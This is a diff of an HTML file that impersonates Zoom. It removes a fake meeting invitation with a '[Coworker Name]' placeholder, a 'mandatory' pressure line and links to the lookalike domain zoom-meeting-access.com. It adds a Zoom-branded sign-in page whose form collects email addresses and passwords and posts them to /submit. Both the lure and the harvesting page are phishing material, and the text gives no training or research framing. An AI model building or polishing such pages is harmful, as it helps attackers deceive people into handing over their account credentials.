@@ -2,46 +2,105 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Zoom Meeting Invitation</title>
+    <title>Sign In - Zoom</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            background-color: #f9f9f9;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 400px;
+            margin: 80px auto;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            padding: 40px;
+            border-radius: 8px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo img {
+            width: 150px;
+        }
+        h2 {
+            color: #2d2d2d;
+            text-align: center;
+            font-weight: normal;
+            margin-bottom: 10px;
+        }
+        label {
+            font-weight: bold;
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+        }
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .button {
+            width: 100%;
+            padding: 12px;
+            background-color: #2d8cff;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .button:hover {
+            background-color: #156dcc;
+        }
+        .link {
+            text-align: right;
+            margin-top: 10px;
+        }
+        .link a {
+            color: #2d8cff;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        .link a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+            margin-top: 30px;
+        }
+    </style>
 </head>
-<body style="font-family: Arial, sans-serif; background-color: #f9f9f9; padding: 20px;">
-    <div style="max-width: 600px; background-color: white; margin: auto; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
-        
-        <div style="text-align: center; margin-bottom: 20px;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Zoom_Communications_Logo.svg/512px-Zoom_Communications_Logo.svg.png" alt="Zoom" width="140">
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://st1.zoom.us/static/6.3.15020/image/new/ZoomLogo.png" alt="Zoom">
         </div>
-        
-        <h2 style="color: #2d2d2d;">[Coworker Name] has invited you to a Zoom Meeting</h2>
-        
-        <p style="font-size: 16px; color: #555;">
-            <strong>Meeting Topic:</strong> Q2 Review — Quick Sync<br>
-            <strong>Duration:</strong> 30 minutes
-        </p>
-        
-        <div style="text-align: center; margin: 30px 0;">
-            <a href="https://zoom-meeting-access.com/join/Q2sync" 
-               style="background-color: #2d8cff; color: white; text-decoration: none; padding: 12px 24px; border-radius: 4px; font-size: 16px;">
-                Join Zoom Meeting
-            </a>
+        <h2>Sign In</h2>
+        <form action="/submit" method="POST">
+            <label for="email">Email Address</label>
+            <input type="email" id="email" name="email" placeholder="email@example.com" required>
+
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required>
+
+            <button class="button" type="submit">Sign In</button>
+        </form>
+        <div class="link">
+            <a href="#">Forgot Password?</a>
         </div>
-        
-        <p style="font-size: 14px; color: #555;">
-            <strong>Meeting ID:</strong> 882-XXXX-XXXX<br>
-            <strong>Passcode:</strong> 478392
-        </p>
-        
-        <p style="font-size: 13px; color: #999;">
-            Note: This meeting is mandatory. Please join on time.<br><br>
-            If the button does not work, copy and paste the following link into your browser:<br>
-            <a href="https://zoom-meeting-access.com/join/Q2sync" style="color: #2d8cff;">https://zoom-meeting-access.com/join/Q2sync</a>
-        </p>
-        
-        <hr style="border: none; border-top: 1px solid #eee; margin: 20px 0;">
-        
-        <p style="font-size: 12px; color: #999; text-align: center;">
-            © Zoom Video Communications, Inc. 2025<br>
-            [https://zoom.us](https://zoom.us)
-        </p>
+        <div class="footer">
+            © Zoom Video Communications, Inc. 2025
+        </div>
     </div>
 </body>
 </html>
